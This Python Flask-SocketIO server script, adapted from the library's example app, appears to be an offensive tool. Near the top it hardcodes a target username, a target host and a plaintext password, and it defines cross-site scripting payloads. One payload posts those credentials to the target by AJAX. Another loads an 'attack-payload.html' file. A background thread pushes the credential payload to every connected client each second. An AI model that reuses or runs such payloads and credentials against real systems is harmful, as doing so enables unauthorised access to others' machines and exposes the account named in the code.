import time
from threading import Thread
from flask import Flask, render_template, session, request
from flask.ext.socketio import SocketIO, emit, join_room, leave_room, \
    close_room, disconnect

app = Flask(__name__)
app.debug = True
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)
thread = None

target_user = 'devera'
target_url = 'storm.cis.fordham.edu'
password = 'troisetudes'

ping_payload = 'ping<script>console.log("hello world");</script>'
ssh_ping_payload = '<script>$(document).ready(function(){$.ajax({url: '+ target_url +',type: "POST",data: $(this).serialize(),username:'+target_user+',password: '+password+',success: function(data){console.log(data);},});});</script>'
bitch_payload = '<script>$(document).ready(function(){$("#toggle-mon").load("../static/php/attack-payload.html");});'

def background_thread():
    """Example of how to send server generated events to clients."""

    count = 0
    while True:
        time.sleep(1)
        count += 1
        start = time.strftime("%X")
        header = '<br>CLIENT @' + start + ': '
        socketio.emit('my response',
                      {'data': header},namespace='/br00t')
        socketio.emit('my response',
                      {'data': ssh_ping_payload},namespace='/br00t')


@app.route('/')
def index():
    global thread
    print "app route initiated"
    #if thread is None:
    thread = Thread(target=background_thread)
    thread.start()

    return render_template('snake.html')

@socketio.on('my event', namespace='/br00t')
def test_message(message):
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response',
         {'data': message['data'], 'count': session['receive_count']})


@socketio.on('my broadcast event', namespace='/br00t')
def test_broadcast_message(message):
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response',
         {'data': message['data'], 'count': session['receive_count']},
         broadcast=True)


@socketio.on('join', namespace='/br00t')
def join(message):
    join_room(message['room'])
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response',
         {'data': 'In rooms: ' + ', '.join(request.namespace.rooms),
          'count': session['receive_count']})


@socketio.on('leave', namespace='/br00t')
def leave(message):
    leave_room(message['room'])
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response',
         {'data': 'In rooms: ' + ', '.join(request.namespace.rooms),
          'count': session['receive_count']})


@socketio.on('close room', namespace='/br00t')
def close(message):
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response', {'data': 'Room ' + message['room'] + ' is closing.',
                         'count': session['receive_count']},
         room=message['room'])
    close_room(message['room'])


@socketio.on('my room event', namespace='/br00t')
def send_room_message(message):
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response',
         {'data': message['data'], 'count': session['receive_count']},
         room=message['room'])


@socketio.on('disconnect request', namespace='/br00t')
def disconnect_request():
    session['receive_count'] = session.get('receive_count', 0) + 1
    emit('my response',
         {'data': 'Disconnected!', 'count': session['receive_count']})
    disconnect()


@socketio.on('connect', namespace='/br00t')
def test_connect():
    emit('my response', {'data': 'SERVER: client connected', 'count': 0})


@socketio.on('disconnect', namespace='/br00t')
def test_disconnect():
    print('Client disconnected')


if __name__ == '__main__':
    socketio.run(app)
